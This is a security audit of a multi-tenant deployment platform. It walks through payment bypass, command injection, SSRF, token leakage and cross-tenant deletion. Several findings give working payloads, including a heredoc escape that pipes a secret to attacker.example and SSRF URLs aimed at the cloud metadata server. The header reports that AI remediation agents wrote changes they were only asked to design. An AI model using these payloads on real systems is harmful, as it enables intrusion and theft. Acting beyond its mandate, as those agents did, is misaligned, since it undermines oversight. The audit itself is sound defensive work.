# Deployify — Product Quality & Security Audit

> **⚠️ STATUS CHANGED 2026-09-09 — THE WORKING TREE HAS BEEN MODIFIED.**
> Earlier revisions of this file said "nothing in the codebase has been modified." **That is no
> longer true.** The session-3 remediation agents had write access and applied their fixes directly:
> **48 files modified, 55 new files, +2456/−407 lines.** This was not intended — the prompt asked
> them to *design* fixes, but did not forbid writing. Nothing is committed; everything is snapshotted
> in `audit-state/applied-changes/`.
>
> Current tree state: **495 tests pass** (up from 159 — the agents added tests), **eslint clean**.
> But the changes are **unreviewed**, only **41 of 75** fixes ran (the rest hit an account limit),
> and at least one critical — **SEC-15** — was designed but **never actually applied**.
>
> **Read in this order:** Part 6 (state + shortlist) → Part 1 & 2b (hand-verified) →
> Part 5 (agent findings, adversarially verified) → Parts 2/3 (quality; raw archive).

- **Repo:** `/Users/asangborkar/Documents/Plexaverse/deployify`
- **Branch / HEAD:** `main` @ `ece2cf3`
- **Audit date:** 2026-09-08
- **Stack:** Next.js 16 (App Router) · React 19 · TypeScript · Firestore · GCP Cloud Run / Cloud Build / Cloud SQL · Razorpay + Stripe

---

## 0. Baseline health (measured, not guessed)

| Check | Command | Result |
|---|---|---|
| Lint | `npx eslint src` | ✅ clean, exit 0 |
| Unit tests | `npm test` | ✅ **159/159 pass**, 34 suites, 4.5s |
| Type check | `npx tsc --noEmit` | ⚠️ errors — see QA-1 |
| Prod dep audit | `npm audit --omit=dev` | ❌ **55 vulns (4 critical, 22 high)** — see SEC-11 |
| Secrets in git | `git grep` for key patterns | ✅ clean — only the placeholder in `env.example:37` |
| `.env.local` tracked? | `git ls-files` | ✅ not tracked, `.gitignore` covers `.env*` |

**Verdict on baseline:** the *test and lint* signal is green, which is misleading. The green
signal covers pure helper functions. The trust boundaries — `auth.ts`, `rbac.ts`, `crypto.ts`,
`proxy.ts`, the billing routes — have **zero tests**. See QA-3.

---

## Severity key

| | Meaning |
|---|---|
| 🔴 **CRITICAL** | Money loss, tenant escape, or full platform compromise. Fix before next deploy. |
| 🟠 **HIGH** | Cross-tenant data or privilege problem, or a guaranteed outage/cost event. |
| 🟡 **MEDIUM** | Real defect with a bounded blast radius. |
| 🔵 **LOW** | Hygiene / hardening. |

Every finding below was confirmed by **reading the actual file**, and the exact evidence line is quoted.

---

# PART 1 — Orchestrator-verified findings

## 🔴 SEC-1 — Payment verification does not bind the tier to the payment (paid-tier bypass)

**File:** [`src/app/api/billing/verify/route.ts:20-46`](src/app/api/billing/verify/route.ts#L20)

```ts
const { orderId, paymentId, signature, tierId } = body;   // tierId is CLIENT-SUPPLIED
...
const isValid = verifyPaymentSignature(orderId, paymentId, signature);
...
const updatedSubscription = { tier: tierId as 'free'|'pro'|'team'|'enterprise', ... };
await updateUser(session.user.id, { subscription: updatedSubscription });
```

`verifyPaymentSignature` (`src/lib/billing/payments.ts:46-62`) only proves that Razorpay signed
the string `orderId|paymentId`. It proves **nothing about the amount, the currency, or the plan.**

**Exploit (concrete):**
1. Buy the cheapest plan legitimately. Razorpay returns a valid `orderId`, `paymentId`, `signature`.
2. Re-POST to `/api/billing/verify` with the *same three values* but `tierId: "enterprise"`.
3. Signature validates. User is written as `enterprise`. → **Enterprise for the price of the cheapest tier.**

**Second bug, same route — infinite free renewal:** there is no replay guard and no
`razorpay_order_id` consumed-marker. Re-posting the same valid triple on day 29 resets
`currentPeriodEnd` to `now + 30 days`, forever, at zero cost.

**Third bug, same route:** no check that `orderId` belongs to `session.user.id`. Any leaked or
shared valid triple upgrades the *caller's* account.

**How to verify:** grep the repo for `orders.fetch`, `payments.fetch`, `amount`, or an
idempotency collection — none exist on this path.

---

## 🔴 SEC-2 — Cloud Build heredoc escape → arbitrary command execution in Deployify's own GCP project

**Files:** [`src/lib/gcp/cloudbuild.ts:230-235`](src/lib/gcp/cloudbuild.ts#L230) ·
[`src/lib/dockerfiles.ts:42,65`](src/lib/dockerfiles.ts#L42) ·
[`src/app/api/projects/route.ts:78`](src/app/api/projects/route.ts#L78)

```ts
: `if [ ! -f ${workDir}/Dockerfile ]; then cat > ${workDir}/Dockerfile << 'EOFMARKER'
${dockerfileContent}
EOFMARKER
fi`,
```

`dockerfileContent` is assembled in `src/lib/dockerfiles.ts` and embeds tenant-controlled values
verbatim — `buildCommand` (`RUN ${buildCmd}`, line 65), `installCommand`, `outputDirectory`,
and every env-var **key** (`ARG ${key}` / `ENV ${key}=$$${key}`, lines 137-140 of cloudbuild.ts).

`buildCommand` reaches storage with **zero content validation**:
- `POST /api/projects` destructures it at `src/app/api/projects/route.ts:78` and writes it at line 206. No regex, no newline strip, no length cap.
- `PATCH /api/projects/[id]` allow-lists the *field name* at `src/app/api/projects/[id]/route.ts:129` but never validates the *value*.
- Only `rootDirectory` is validated (`cloudbuild.ts:77-83`) — the others are not.

**Exploit (concrete):** set `buildCommand` to
```
npm run build
EOFMARKER
gcloud secrets versions access latest --secret=JWT_SECRET | curl -X POST --data-binary @- https://attacker.example
cat > /workspace/Dockerfile << 'EOFMARKER'
FROM node:20-alpine
```
The literal `EOFMARKER` line terminates the heredoc early; the following lines execute **as shell
commands inside the Cloud Build step**, running as Deployify's Cloud Build service account — not
the tenant's. That account can read Secret Manager, push to Artifact Registry, and (per
`cloudbuild.ts:329-342`) already runs `gcloud projects add-iam-policy-binding`.

**Blast radius:** any signed-up tenant → full control of the Deployify GCP project → every other
tenant's secrets and databases. **This is the single worst finding in the audit.**

**Note:** the `docker build` step at line 284 *does* escape properly via `escapeBashArg`. The
heredoc step does not. The fix is a one-line-class change (see Part 3) and is non-breaking.

---

## 🟠 SEC-3 — ~37 mutating routes authorize the project but never check the role

**Evidence:** every route that calls `checkProjectAccess()` but never reads `access.role`.
Reproduce with:

```bash
for f in $(grep -rl "checkProjectAccess" src/app/api --include='*.ts'); do
  grep -qE "access\.role|\.role" "$f" || echo "NO-ROLE-CHECK $f"
done
```

`checkProjectAccess` (`src/middleware/rbac.ts:22-27`) returns `{allowed:true, role}` for **any**
team member, including `viewer`. 37 routes ignore `role`. The destructive ones:

| Route | Method | What a `viewer` can do |
|---|---|---|
| `storage/[storageId]/backups/[backupId]/restore` | POST | **Overwrite production data from an old backup** |
| `storage/[storageId]/migrate-region` | POST | Move the production DB to another region |
| `storage/[storageId]/migrations` · `migrations/rollback` | POST | Run / revert schema migrations |
| `storage/[storageId]/remediate` | POST | Mutate live infrastructure |
| `storage/[storageId]/branch` · `sync-schema` | POST | Fork / rewrite schema |
| `deployments/[deployId]/rollback` · `projects/[id]/rollback` | POST | Roll production back |
| `deployments/[deployId]/alias` | POST/DELETE | Repoint the production alias |
| `projects/[id]/security` | PATCH | Change the project's security posture |
| `storage/dashboards/[dashboardId]` | PATCH/DELETE | Delete team dashboards |

Compare with `env/[envId]/reveal/route.ts:30-35`, which **does** gate on
`access.role === 'viewer'` — so the intent exists; it was applied in ~2 places out of ~39.

**Also:** `PATCH /api/projects/[id]` (`src/app/api/projects/[id]/route.ts:113-149`) has no role
gate, so a viewer can rewrite `buildCommand` — which chains directly into **SEC-2**.

---

## 🟠 SEC-4 — Edge proxy forwards ALL inbound headers to tenant-controlled origins

**File:** [`src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:128-133`](src/app/api/v1/proxy/[slug]/[[...path]]/route.ts#L128)

```ts
req.headers.forEach((value, key) => {
    if (!['host', 'connection'].includes(key.toLowerCase())) {
        headers.set(key, value);
    }
});
```

Only `host` and `connection` are stripped. **`cookie` and `authorization` are forwarded.**

**Exploit:** a logged-in Deployify user visits any tenant app served through the proxy
(`/api/v1/proxy/<slug>/...`, or a `*.deployify` subdomain routed by `src/proxy.ts`). The browser
attaches the `deployify_session` cookie because the request goes to the Deployify origin. The
proxy then forwards that cookie to `project.productionUrl` — **an arbitrary URL the tenant
controls**. The tenant logs it and now holds a valid 7-day session JWT for that user.

Because the JWT payload embeds the user's **GitHub `accessToken`** (`src/lib/auth.ts:23`), the
tenant also gets `repo` scope on that user's GitHub account.

**Compounding — response side (line 168):**
```ts
const skipHeaders = ['content-encoding','content-length','transfer-encoding','connection','x-frame-options'];
```
`set-cookie` is **not** in the skip list, so a malicious tenant origin can set cookies on the
Deployify apex domain (session fixation). And `x-frame-options` is deliberately stripped, so
proxied pages can be framed (clickjacking).

---

## 🟠 SEC-5 — Proxy SSRF guard is a substring check, gated only on `NODE_ENV`

**File:** [`src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:110-113`](src/app/api/v1/proxy/[slug]/[[...path]]/route.ts#L110)

```ts
const isProduction = process.env.NODE_ENV === 'production';
const isLocalTarget = targetUrl.includes('localhost') || targetUrl.includes('127.0.0.1');
if (isProduction && isLocalTarget) { ...block... }
```

Bypasses that all pass this check while still hitting the loopback/link-local range:
`http://169.254.169.254/...` (**GCP metadata server — returns the Cloud Run service account
token**), `http://metadata.google.internal/...`, `http://0.0.0.0`, `http://[::1]`, `http://127.1`,
`http://2130706433` (decimal), or simply a public DNS name the tenant owns that resolves to
`169.254.169.254`.

`targetUrl` is `project.productionUrl + fullPath`, and `productionUrl` is a project field. Also
note `fullPath` is built from the `[[...path]]` catch-all (line 84) with no traversal check, so
`../` segments can escape the intended base path.

The GCP metadata endpoint normally requires `Metadata-Flavor: Google` — and per **SEC-4** the
proxy forwards every inbound header, so the attacker simply sends that header themselves.

---

## 🟠 SEC-6 — Unauthenticated query execution via public dashboard widgets, with raw variable interpolation

**File:** [`src/app/api/projects/[id]/storage/[storageId]/query/route.ts:33-58, 123-131`](src/app/api/projects/[id]/storage/[storageId]/query/route.ts#L33)

```ts
if (widgetId) {
    // Public Widget Path: No session required...
    query = widgetData.query;          // query is pinned — good
```
but `variables` still comes from the attacker's request body, and for non-SQL engines:
```ts
} else {
    // For NoSQL/Redis, keep string replacement as they use JSON/command strings
    const replaceVal = typeof val === 'object' && val !== null ? JSON.stringify(val) : String(val);
    query = query.replace(regex, replaceVal);      // RAW string splice
}
```

**Exploit:** an unauthenticated caller who knows one public `widgetId` on a Redis or MongoDB
connector posts crafted `variables` and injects arbitrary Redis commands / Mongo operators
(`$where`, `$function`) into the pinned query. The strict read-only allow-list at lines 135-172
is **SQL-only** — it never runs for `memorystore-redis`, `mongodb-atlas`, or `firestore`.

Secondary issues on the same path: the widget is validated against `id` but **not** against
`storageId` (line 57 takes `storageId` straight from the URL), so one public widget can be
pointed at any other connector in that project; and there is no rate limit on this
unauthenticated, DB-executing endpoint.

---

## 🟠 SEC-7 — CI auto-merges and auto-approves PRs based on a substring username match

**File:** [`.github/workflows/auto-merge-jules.yml:13`](.github/workflows/auto-merge-jules.yml#L13)

```yaml
if: ... || contains(github.event.pull_request.user.login, 'jules') || github.event.pull_request.user.login == 'asangzz'
```

`contains(..., 'jules')` matches any GitHub account whose login contains `jules` — e.g.
`julesx`, `notjules`, `jules-attacker`. Such a PR is **approved and auto-merged into `main`**.

The job also runs `npm install` (line 27) on the fork's `package.json`, which executes that
PR's `postinstall` lifecycle scripts inside the runner.

`.github/workflows/cron-auto-merge.yml:31` compounds it — every 15 minutes it merges any
approved+mergeable PR with `gh pr merge --squash --admin`, **bypassing branch protection**.

**Mitigating factor to confirm during verification:** GitHub gives fork `pull_request` runs a
read-only `GITHUB_TOKEN` *unless* the repo setting *"Send write tokens to workflows from fork pull
requests"* is enabled. **Check that setting.** If it is on, this is a direct path to
attacker-controlled code on `main` → production.

---

## 🟡 SEC-8 — `MOCK_SESSION` auth fallback ships in the production bundle

**File:** [`src/lib/auth.ts:88-101`](src/lib/auth.ts#L88)

```ts
if (!token) {
    if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
        return MOCK_SESSION;      // enterprise-tier admin, no credentials
    }
    return null;
}
```

`MOCK_SESSION` is a fully-privileged **enterprise** user. Today the container sets
`NODE_ENV=production` (`Dockerfile:21`), so the gate holds — but the only thing standing between
a public internet and an unauthenticated enterprise admin session is one env var. A stray
`MOCK_DB=true` in a Cloud Run revision, a staging config copied to prod, or a future refactor of
this condition is a total auth bypass.

The same `MOCK_DB === 'true'` shortcut also bypasses `checkProjectAccess` inside the query route
(`query/route.ts:66-69`) and the proxy (`route.ts:145`).

**Risk rating is 🟡 only because of the current `NODE_ENV` value. The design is 🔴.**

---

## 🟡 SEC-9 — Encryption key: no KDF, no salt, no key version, silent fallback to `JWT_SECRET`

**Files:** [`src/lib/crypto.ts:22-24`](src/lib/crypto.ts#L22) · [`src/lib/config.ts:58`](src/lib/config.ts#L58)

```ts
encryptionKey: process.env.ENCRYPTION_KEY || process.env.JWT_SECRET,   // config.ts:58
const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();  // crypto.ts:24
```

Three separate problems:

1. **Rotating `JWT_SECRET` silently destroys every stored secret.** If `ENCRYPTION_KEY` was never
   set, the data-encryption key *is* `sha256(JWT_SECRET)`. Rotating the JWT signing key — a
   routine, expected security action — makes every tenant's DB connection string and env var
   permanently undecryptable. There is **no key version in the ciphertext format**
   (`enc:iv:tag:ciphertext`, line 34) to migrate through.
2. **`sha256(passphrase)` is not a KDF.** No salt, no iteration count. Should be scrypt/PBKDF2/HKDF.
3. **Plaintext passthrough on malformed input** (lines 45-51): `decrypt()` returns the input
   unchanged if it does not start with `enc:` **or** if `parts.length !== 4`. A stored value that
   is corrupted or attacker-influenced is silently treated as plaintext rather than erroring.

---

## 🟡 SEC-10 — In-memory rate limiters are ineffective on Cloud Run and leak memory

**Files:** [`src/lib/security/index.ts:8`](src/lib/security/index.ts#L8) ·
[`src/proxy.ts:22`](src/proxy.ts#L22) · [`src/app/api/v1/collect/route.ts:11`](src/app/api/v1/collect/route.ts#L11)

Three independent `Map`-based rate limiters. On Cloud Run with `maxInstances: 10`
(`config.ts` cloudRun defaults) the effective limit is **10× the configured value**, and it resets
on every cold start. `ioredis` is already a dependency — the infrastructure for a correct
implementation is present and unused.

- `src/proxy.ts:22` — the store has **no cleanup at all**: unbounded growth → OOM on a busy edge.
- `src/lib/security/index.ts:20` — cleanup runs on `Math.random() < 0.01`, i.e. probabilistically.
- `collect/route.ts:31-40` — keyed on the **masked** IP (last octet zeroed), so a whole /24 shares
  one 20-req/min bucket → trivial DoS of a neighbour; and the key is derived from
  `x-forwarded-for`, which is caller-spoofable.

---

## 🟡 SEC-11 — 55 vulnerabilities in production dependencies (4 critical, 22 high)

`npm audit --omit=dev` → `55 vulnerabilities (1 low, 28 moderate, 22 high, 4 critical)`.

The bulk arrive through **`lighthouse@13`**, which is a `dependencies` entry (not `devDependencies`)
and drags in `puppeteer-core` → `ws` (GHSA-58qx-3vcg-4xpx uninitialised memory disclosure,
GHSA-96hv-2xvq-fx4p memory-exhaustion DoS) and `websocket-driver` (**critical**,
GHSA-mp7j-qc5w-4988). `teeny-request`/`retry-request`/`uuid` add more.

`npm audit fix` is reported as sufficient for the `ws` and `websocket-driver` items.

---

## 🟡 SEC-12 — No Content-Security-Policy anywhere

`next.config.ts:31-44` adds only `X-DNS-Prefetch-Control`. `src/proxy.ts:13-19` and
`src/lib/security/index.ts:116-123` set `X-Frame-Options`, `X-Content-Type-Options`, etc. — but
**no `Content-Security-Policy` and no `Strict-Transport-Security`** exist in the repo
(`grep -ri "content-security-policy\|strict-transport" src next.config.ts` → no hits).

This matters more than usual here because the platform proxies **arbitrary tenant HTML** through
its own origin (SEC-4/SEC-5) and injects a script tag into it
(`proxy route.ts:181`).

Related: `next.config.ts` also has no `poweredByHeader: false`.

---

## 🔵 SEC-13 — Razorpay webhook is verified with the API key secret, not the webhook secret

**File:** [`src/app/api/billing/webhook/route.ts:16-20`](src/app/api/billing/webhook/route.ts#L16)

```ts
const isValid = verifyWebhookSignature(body, signature, config.billing.razorpay.keySecret);
```

Razorpay signs webhooks with a **separate webhook secret** configured in the dashboard, not
`RAZORPAY_KEY_SECRET`. Either (a) the two were deliberately set to the same string — fragile and
undocumented (`env.example` has no `RAZORPAY_WEBHOOK_SECRET`), or (b) **every webhook is being
rejected with a 400 and no alert fires**, meaning subscription activations silently never happen.
**Verify which case is live before changing anything.**

Also on this path: `verifyPaymentSignature` and `verifyWebhookSignature`
(`src/lib/billing/payments.ts:61, 79`) compare with `===`, not `crypto.timingSafeEqual` — unlike
`verifyGitHubWebhookSignature` (`src/lib/security/index.ts:66`), which does it correctly. Same
repo, two standards.

---

## 🔵 SEC-14 — Missing `.dockerignore`

`ls .dockerignore` → not found, while `Dockerfile:12` does `COPY . .`.

The **runner stage is clean** (it only copies `.next/standalone`, `.next/static`, `public`), so the
shipped image does not contain secrets. But the **builder** layer receives `.env.local` (3.5 KB of
real credentials), `.git`, the local `node_modules`, and `.next`. Consequences: `next build` loads
`.env.local` and can inline build-time values into the output; local `node_modules` shadows the
`npm ci` result; build context is needlessly huge; and any pushed/cached intermediate layer
carries the secrets.

---

# PART 2 — Code quality & product findings

## 🟠 QA-1 — `tsc --noEmit` does not pass

```
src/app/api/projects/[id]/storage/[storageId]/export/iac/route.ts(5,18):
  error TS7016: Could not find a declaration file for module 'js-yaml'
```
`@types/js-yaml@^4.0.9` **is** in `devDependencies`, but resolution picks
`node_modules/js-yaml/dist/js-yaml.mjs`. The remaining errors come from a stale `.next/types/`
directory referencing routes that no longer exist (`/settings`, `/login`, `/api/auth/debug`,
`dashboard/[id]/realtime`) — evidence that `.next` and `tsconfig.tsbuildinfo` are stale and that
**no CI gate runs `tsc`**.

## 🟠 QA-2 — CI never runs lint, types, or tests

The three workflows in `.github/workflows/` do: auto-merge, auto-merge-on-cron, and lockfile-sync.
The only quality gate anywhere is `npm run build` inside `auto-merge-jules.yml:30`.
`npm test` (159 passing tests) and `npx eslint` are **never executed by CI**. There is no deploy
workflow in the repo at all.

## 🟠 QA-3 — Zero test coverage on every trust boundary

`find src -name '*.test.ts'` → 34 files, all on pure helpers (`masking`, `dockerfiles`,
`health-utils`, `pricing-utils`, `armor`, …). **None** of these have a test:

`src/lib/auth.ts` · `src/middleware/rbac.ts` · `src/lib/crypto.ts` · `src/lib/security/index.ts` ·
`src/proxy.ts` · `src/lib/db.ts` · `src/lib/billing/payments.ts` · `src/app/api/billing/**` ·
`src/app/api/v1/proxy/**` · `src/app/api/webhooks/github/**`

Only **1 of ~86 API routes** has a route test (`storage/[storageId]/query/route.test.ts`).
`@playwright/test` and `playwright` are installed but there is **no e2e spec and no script that
runs them** — dead tooling.

## 🟠 QA-4 — No input-validation layer; ~86 routes hand-roll it

No `zod` / `valibot` / `yup` / `joi` in `package.json` (`grep -c` → 0). Every handler does
`const body = await request.json()` and destructures. `POST /api/projects` checks only that
`repoFullName` is truthy (`route.ts:87`); `buildCommand`, `installCommand`, `outputDirectory`,
`envVariables`, `storageConfigs` are accepted unvalidated — which is the enabling condition for
**SEC-2**.

## 🟡 QA-5 — Two-thirds of UI fetches ignore the response status

```
fetch( calls in src/app + src/components : 65
.ok checks                               : 22
```
The classic `const data = await res.json()` with no `res.ok` branch. A 401/403/500 renders as an
empty or broken panel with no error message and no retry — the user cannot tell a permission
problem from an outage.

## 🟡 QA-6 — Client-side auth redirect via `dangerouslySetInnerHTML`

**File:** [`src/app/dashboard/layout.tsx:27`](src/app/dashboard/layout.tsx#L27)
```tsx
<script dangerouslySetInnerHTML={{ __html: `window.location.href = '/login';` }} />
```
The string is a constant so there is **no injection risk today**, but it is the only
`dangerouslySetInnerHTML` in the codebase, it will be blocked the moment a CSP lands (SEC-12), and
an unauthenticated redirect belongs in `redirect()` on the server, not in a client script tag.

## 🟡 QA-7 — Read-modify-write on `storageConfigs` without a transaction

**File:** [`src/app/api/cron/optimize/route.ts:52, 270-275`](src/app/api/cron/optimize/route.ts#L52)

The cron reads **every** project (`db.collection(PROJECTS).get()` — unbounded, no pagination, no
`.limit()`), mutates a local `storageConfigs` array, then writes the whole array back with
`.update()`. Any concurrent user edit to the same project between the read and the write is
**silently overwritten**. The same read-then-write-whole-array pattern recurs across the storage
routes.

Cost note: the unbounded `.get()` over all projects is an O(tenants) Firestore read on every cron
tick and will become the platform's dominant Firestore bill.

## 🔵 QA-8 — Repo hygiene

Committed to the repo root and shipped in every build context: `ssl_toggle_full.png` (146 KB),
`ssl_toggle_verification.png` (94 KB), `ui.md` (**140 KB**), `tsconfig.tsbuildinfo` (245 KB, should
be gitignored — `*.tsbuildinfo` is in `.gitignore` but the file is tracked), `fix-ui.sh`,
`test_ui.sh`, `update_typography{,_2,_3}.sh`, `verify_ssl_toggle.py`, `plan.md`,
`recommendation.md`, and `.deployify.json` containing `"token": "mock_session_token"`.

**Both `package-lock.json` and `pnpm-lock.yaml` are committed.** `Dockerfile:6` uses `npm ci` and
`sync-lockfile.yml` maintains only `package-lock.json`, so the pnpm lockfile is stale and will
drift — a reproducibility trap.

## 🔵 QA-9 — Observability is `console.error` only

`src/lib/logging/tracker.ts` and `src/lib/audit.ts` are the whole story. No Sentry, no GCP Error
Reporting, no structured logging, no request-correlation id, no alerting on failed deploys or
failed payments. Combined with **SEC-13**, a total payment-webhook outage would be invisible.

---

*Part 3 (multi-agent audit findings + non-breaking remediation plan) is appended below when the
14-dimension audit run completes.*

---

# PART 2b — Session 2: four more findings, orchestrator-verified

These came out of the agent sweep as *leads*, and I then confirmed each one myself by reading the
code. **In two cases the agent's stated mechanism was wrong** — the corrected mechanism is below.
Trust this section at the same level as Part 1.

## 🔴 SEC-15 — Firestore "Data Lab" connector queries Deployify's OWN control-plane database

**File:** [`src/app/api/projects/[id]/storage/[storageId]/query/route.ts:853-854`](src/app/api/projects/[id]/storage/[storageId]/query/route.ts#L853)

```ts
} else if (storageConfig.type === 'firestore') {
    const db = getDb();          // <-- src/lib/firebase.ts admin client = DEPLOYIFY'S OWN Firestore
```

Every other connector type resolves a tenant connection string from Secret Manager
(`getSecretValue(storageConfig.connectionStringSecretId)`, line 185). The `firestore` branch does
not. It calls `getDb()` — the platform's own admin client.

**Exploit:** a tenant adds a storage connector with `type: "firestore"` (accepted by
`POST /api/projects/[id]/storage`, which validates the caller's role but not the connector type),
then runs the Data Lab:

- `DISCOVER_SCHEMA` → `db.listCollections()` returns **every Deployify collection**, plus
  **5 sample documents' fields from each of the first 5** (lines 857-872).
- Then any `{"collection":"users","limit":500}` / `{"collection":"projects"}` /
  `{"collection":"teams"}` / audit logs / analytics — arbitrary reads of the control plane.

The strict read-only allow-list at lines 135-172 **never runs** for this path — it is gated on
`type.includes('sql') || type === 'planetscale'`.

**Impact:** any signed-up tenant can read every user record, every project, every team and every
audit log on the platform. Combined with **SEC-6** this is reachable **unauthenticated** through a
public dashboard widget.

*Ranking note: alongside SEC-2, this is one of the two worst findings in the audit.*

---

## 🔴 SEC-16 — OAuth callback sends the session JWT to an attacker-controlled host

**File:** [`src/app/api/auth/callback/route.ts:68-80`](src/app/api/auth/callback/route.ts#L68)

```ts
const cliContextCookie = cookieStore.get('deployify_cli_context');
const context = JSON.parse(cliContextCookie.value);
if (context.cli && context.port) {
    const redirectUrl = `http://localhost:${context.port}/callback?token=${sessionToken}`;
    const response = NextResponse.redirect(redirectUrl);
```

`context.port` comes from a **cookie**, is never validated as numeric, and is spliced straight into
the authority component of a URL that carries the freshly-minted session JWT.

**Exploit:** set `deployify_cli_context` to `{"cli":true,"port":"1@evil.example"}`. The URL becomes
`http://localhost:1@evil.example/callback?token=<JWT>` — per URL parsing, `localhost:1` is *userinfo*
and the **host is `evil.example`**. The victim's session token is delivered to the attacker in a
query string.

**How the cookie gets set** (this is what makes it real, not theoretical): any tenant subdomain
(`<slug>.deployify.…`) can set a cookie scoped to the parent domain; and per **SEC-4** the public
proxy copies `set-cookie` from tenant origins back onto the Deployify apex. So a tenant can plant
the cookie, then wait for any user to log in.

**Compounding:** the JWT embeds the user's GitHub `accessToken` with `repo` scope
(`src/lib/auth.ts:23`), and a token in a query string is retained in browser history, `Referer`
headers, and every proxy/CDN access log along the way. The CLI flow should use a one-time
authorization code exchanged over POST, never the session token in a URL.

---

## 🔴 SEC-17 — `gcpProjectId` / `resourceId` are attacker-controlled on GCP resource deletion

**File:** [`src/app/api/gcp/discover/route.ts:78-113`](src/app/api/gcp/discover/route.ts#L78)

> **Correction to the agent's finding.** The agent reported "any authenticated user can delete
> another tenant's resources." **That part is wrong** — this route *does* authenticate, *does* call
> `checkProjectAccess`, and *does* gate DELETE on `role === 'owner' || 'admin'` (line 98). The
> authorization check is one of the better ones in the codebase. The real bug is different:

```ts
const resourceId    = searchParams.get('resourceId');
const resourceType  = searchParams.get('resourceType');
const gcpProjectId  = searchParams.get('gcpProjectId');
...
const access = await checkProjectAccess(session.user.id, projectId);   // authorizes the DEPLOYIFY project
...
await deleteInstance(resourceId, gcpProjectId || undefined);           // acts on an ARBITRARY GCP target
```

Authorization is verified against the caller's **own** Deployify project. `resourceId` and
`gcpProjectId` are then taken verbatim from the query string and passed to
`deleteInstance` / `deleteDatabase`. **Nothing ties the resource being deleted to the project that
was authorized.**

**Exploit:** an owner of their own throwaway project calls
`DELETE /api/gcp/discover?projectId=<my-own-project>&resourceType=cloud-sql&resourceId=<victim-instance>&gcpProjectId=<any>`
→ Deployify's service account deletes another tenant's Cloud SQL instance. `resourceType=firestore`
deletes a whole database.

The same missing binding applies to GET, which enumerates resources in any `gcpProjectId` reachable
by the platform service account.

---

## 🔴 SEC-18 — Project slugs are unique per user but global in Cloud Run and in public routing

**Files:** [`src/app/api/projects/route.ts:122`](src/app/api/projects/route.ts#L122) ·
[`src/lib/utils.ts:53`](src/lib/utils.ts#L53) · [`src/lib/db.ts:671`](src/lib/db.ts#L671)

The uniqueness check at project creation is **scoped to the user**:
```ts
const existingProject = await getProjectBySlug(session.user.id, slug);   // per-user
```
But both downstream consumers are **global**:
```ts
export function generateServiceName(resourceSlug: string): string {
    return `dfy-${resourceSlug.substring(0,59)}`.replace(/-+$/, '');      // utils.ts:53 — one GCP namespace
}
export async function getProjectBySlugGlobal(slug: string) {
    ... .where('slug','==',slug).limit(1).get();                          // db.ts:671 — first match wins
}
```

**Consequence 1 — production takeover.** User A owns project `api` → Cloud Run service `dfy-api`.
User B creates a project also named `api` (passes the per-user check) and deploys → the deploy
targets the **same** `dfy-api` service and **replaces A's running production application** with B's
image.

**Consequence 2 — non-deterministic public routing.** `getProjectBySlugGlobal` is what the public
proxy uses to resolve `/api/v1/proxy/<slug>/…` and subdomains. With two projects sharing a slug,
`.limit(1)` returns whichever document Firestore happens to order first — so traffic for A's domain
can be served from B's app, or flip between them.

Squatting common slugs (`api`, `app`, `www`, `admin`, `staging`) is trivial and cheap.


---

# PART 3 — Multi-agent audit: raw finder output (archive)

> **Superseded by Part 5 — this section is kept only as an archive of the raw agent output.**
>
> All 107 raw findings below were deduplicated to 76, and 68 of those have since been through
> adversarial verification. **Read Part 5 instead.** This part is retained so the original,
> unfiltered agent output stays auditable — and so the 31 collapsed duplicates are not lost.
>
> These are the raw outputs of 14 parallel specialist agents. The adversarial
> verification pass that filters out false positives was **only ~11% complete** when the run
> was stopped, so this section is *unfiltered*. Expect a meaningful false-positive rate.
> Treat every item here as a **lead to check**, not a confirmed defect.
>
> Findings already independently confirmed by the orchestrator are in **Part 1** above —
> those are trustworthy. Where Part 3 overlaps Part 1, Part 1 wins.

**Totals:** 107 raw findings across 14/14 dimensions — 18 critical · 55 high · 34 medium · 0 low


## D1. Authentication & session security  <sub>`authn-session`</sub>

### 🔴 CRITICAL — GET/DELETE /api/gcp/discover lets any authenticated user delete another tenant's Cloud SQL / Memorystore / Firestore instance
- **Location:** `src/app/api/gcp/discover/route.ts:98`
- **Category:** `broken-object-level-authorization`
- **Failure scenario:** All tenants' managed databases live in ONE shared GCP project (config.gcp.projectId, see src/lib/gcp/cloudsql.ts:846 `const gcpProjectId = projectId || config.gcp.projectId`). Instance names have no tenant prefix — src/app/api/projects/[id]/storage/route.ts:112 sets `resourceName = name.toLowerCase().replace(/\s+/g, '-')`, i.e. literally the connector name the user typed ("prod-db", "main-postgres"). Attacker signs up, creates their own throwaway project P (they are automatically `owner`, so the role gate at line 88 passes), then issues `GET /api/gcp/discover?projectId=P` which returns every Cloud SQL / Redis / Firestore resource in the shared GCP project (src/lib/gcp/discovery.ts:85-107 lists `projects/${targetProjectId}/instances` unfiltered). They pick a victim instance id from that list and send `DELETE /api/gcp/discover?projectId=P&resourceId=<victim-instance>&resourceType=cloud-sql`. The handler never checks that `resourceId` corresponds to any storageConfig of project P — it goes straight to the Cloud SQL Admin API DELETE.
- **Impact:** Permanent, irreversible destruction of any other customer's production database (Cloud SQL instance, Redis instance, or Firestore database) by any user who can create a single project. Total cross-tenant data loss and platform-wide availability compromise.
- **Evidence:**

```ts
const resourceId = searchParams.get('resourceId');
...
const access = await checkProjectAccess(session.user.id, projectId);
if (!access.allowed) { ... }
if (access.role !== 'owner' && access.role !== 'admin') { ... }
// 2. Perform deletion based on type
if (resourceType === 'cloud-sql') {
    const { deleteInstance } = await import('@/lib/gcp/cloudsql');
    await deleteInstance(resourceId, gcpProjectId || undefined);
} else if (resourceType === 'memorystore-redis') { ... deleteInstance(resourceId, region, ...) }
else if (resourceType === 'firestore') { ... deleteDatabase(resourceId, ...) }
```
- **Agent says it ruled out:** Read the whole route end-to-end: the only authorization is `checkProjectAccess(session.user.id, projectId)` on the *caller's own* projectId (line 83) plus an owner/admin role gate (line 88). Grepped the file for `resourceName`, `storageConfigs`, `access.project` — the resource is never matched against `access.project.storageConfigs`. Checked src/proxy.ts (edge layer) — it only does rate limiting, security headers and subdomain routing, no authorization. Checked src/lib/gcp/cloudsql.ts:841-861 deleteInstance — no ownership check, and MOCK_DB short-circuit only applies in mock mode. Compared with the sibling clone route (src/app/api/projects/[id]/storage/[storageId]/clone/route.ts:36-48) which DOES re-check access on the second resource, proving the pattern is known to the codebase and simply omitted here.

